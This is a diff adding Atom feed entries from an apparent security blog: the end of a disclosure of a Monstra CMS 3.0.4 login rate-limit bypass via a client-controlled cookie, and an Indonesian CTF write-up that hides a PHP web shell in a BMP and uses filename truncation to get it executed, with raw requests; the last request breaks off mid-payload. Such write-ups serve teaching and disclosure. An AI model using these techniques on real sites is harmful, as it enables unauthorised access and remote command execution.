+            &lt;span class=&quot;nv&quot;&gt;$attempts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$attempts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;Notification&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setNow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'error'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You are banned for 10 minutes. Try again later'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'users'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h4&gt;
+
+&lt;p&gt;Steps to Reproduce:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Always set login_attempts cookie to 0 before send the POST request or if you using burp the cookie will not incrementing.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /monstra-3.0.4/admin/index.php?id=pages HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 42
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+Cookie: PHPSESSID=lsmo61pd53fe8gnmv77uck0c07; _ga=GA1.1.876410326.1527893558; _gid=GA1.1.716559964.1527893558; login_attempts=i%3A0%3B
+Connection: close
+
+login=admin&amp;amp;password=[PASSWORD_HERE]&amp;amp;login_submit=Log+In
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;recommended-patch&quot;&gt;Recommended Patch&lt;/h4&gt;
+&lt;p&gt;Don’t use cookie since we can easily control the value using Session much better&lt;/p&gt;
+
+
+  
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/login-rate-limiting-bypass&quot;&gt;Monstra CMS - 3.0.4 Login Rate Limiting Bypass&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on April 01, 2018.&lt;/p&gt;</content>
+</entry>
+
+
+
+<entry>
+  <title type="html"><![CDATA[Nuitduhack Quals 2018: PixEditor - 350pts]]></title>
+  <link rel="alternate" type="text/html" href="http://localhost:4000/ctf/writeup-nuitdohack-quals-PixEditor"/>
+  <id>http://localhost:4000/ctf/writeup-nuitdohack-quals-PixEditor</id>
+  <published>2018-04-01T00:00:00+07:00</published>
+  <updated>2018-04-01T00:00:00-00:00</updated>
+  
+  <author>
+    <name>Abdillah Muhamad</name>
+    <uri>http://localhost:4000</uri>
+    <email>hasny1337@gmail.com</email>
+  </author>
+  
+  
+  <category scheme="http://localhost:4000/tags/#nuitduhack" term="nuitduhack" />
+  
+  
+  <content type="html">
+  
+    &lt;h2 id=&quot;problem&quot;&gt;Problem&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Create your own pixel art with this powerful tool.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Url :&lt;/strong&gt; http://pixeditor.challs.malice.fr/&lt;/p&gt;
+
+&lt;h2 id=&quot;writeup&quot;&gt;Writeup&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Kita diberikan website yang fungsinya bisa untuk nge-warnain per-pixel dan
+dikirim ke php dalam bentuk array RGB 32*32 (4096), ketika kita coba untuk mengurangi/menambahkan 
+pixel maka akan muncul error &lt;code class=&quot;highlighter-rouge&quot;&gt;Error : &amp;lt;/b&amp;gt;bad pixel art size (must be 32*32*(RGBA), got : 4097)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../images/pixeditor.PNG&quot; alt=&quot;Error&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;ada 3 parameter yang dikirim ke &lt;code class=&quot;highlighter-rouge&quot;&gt;/save.php&lt;/code&gt; yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;data=[RGB]&amp;amp;name=[file.ext]&amp;amp;format=[JPG|GIF|BMP|PNG]&lt;/code&gt;
+pada parameter data kita bisa mengatur data yang akan menjadi konten dari file, nah bagaimana caranya
+agar kita bisa mengirimkan script php dalam bentuk array rgb. dan dari keempat format tersebut 
+kita bisa menggunakan format bmp karena tidak ada compression atau informasi yang di kurangkan CMIIW.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;n&quot;&gt;payloadd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;p?&amp;lt;&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# php&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X p&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hys&quot;&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;yss&quot;&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;met&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d_$&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;(hT&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;EGl&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;c'[&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;')]&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;'b&amp;gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;?;F&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GHI&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;JKL&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;w&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;MNO&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;payloadd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payloadd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payloadd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payloadd&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;kemudian saya membuat script python untuk membuat payload dalam bentuk rgb 32*32,
+menggunakan payload di atas kita bisa mendapatkan file &lt;code class=&quot;highlighter-rouge&quot;&gt;.bmp&lt;/code&gt; dengan 
+backdoor php didalamnya &lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sun 18:51:00 with root in CTF-i/nuitduhack/pixeditor via 🐘 v7.1.14 
+•% ➜ xxd img.bmp
+00000000: 424d 360c 0000 0000 0000 3600 0000 2800  BM6.......6...(.
+00000010: 0000 2000 0000 2000 0000 0100 1800 0000  .. ... .........
+00000020: 0000 000c 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+--SNIP--
+00000bc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000bd0: 0000 0000 0000 3c3f 7068 7020 7379 7374  ......&amp;lt;?php syst
+00000be0: 656d 2824 5f47 4554 5b27 6327 5d29 3b3f  em($_GET['c']);?
+00000bf0: 3e49 4847 4d4c 4b58 5a4f 0000 0000 0000  &amp;gt;IHGMLKXZO......
+00000c00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000c10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000c20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000c30: 0000 0000 0000                           ......
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;tapi kita tidak bisa mengeksekusi php pada format file .bmp ataupun format gambar lainnya 
+saya mencoba menggunakan nullbyte(%00) namun tidak berhasil karena php yang digunakan adalah versi 7,
+berarti kita harus mencoba cari cara lain untuk membuat nama filenya menjadi extensi php yang akan
+membuat script php kita tereksekusi, setelah mencari cara2 lain ternyata ada komentar yang menarik
+pada file javascript http://pixeditor.challs.malice.fr/js/pixeditor.js&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;inputName.maxLength = 45; // 50 - Len(Extension) - Filename will be truncated if len &amp;gt; 50&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;jika input kita lebih dari 50 maka akan di truncate, maka kita menggunakan 46 karakter untuk namafilenya
+dan 4 karakter untuk extensi .php dan ditambah .bmp yang nantinya akan di truncate&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'print &quot;a&quot;*46+&quot;.php.bmp&quot;'&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.bmp&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 1                                           46  50 [Truncated]&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Result : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Kemudian kirimkan semua payload dan menggunakan filename yang 54 karakter kita buat di atas, 
+raw request lengkapnya seperti di bawah ini.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /save.php HTTP/1.1
+Host: pixeditor.challs.malice.fr
+Content-Length: 8333
+Accept: */*
+Origin: http://pixeditor.challs.malice.fr
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://pixeditor.challs.malice.fr/
+Accept-Language: en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5
+Cookie: _ga=GA1.2.818234071.1522464534
+Connection: close
+
+data=[112,63,60,88,32,112,104,121,115,121,115,115,109,101,116,100,95,36,40,104,84,69,71,108,99,39,91,39,41,93,39,98,62,63,59,70,71,72,73,74,75,76,77,78,79,90,88,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,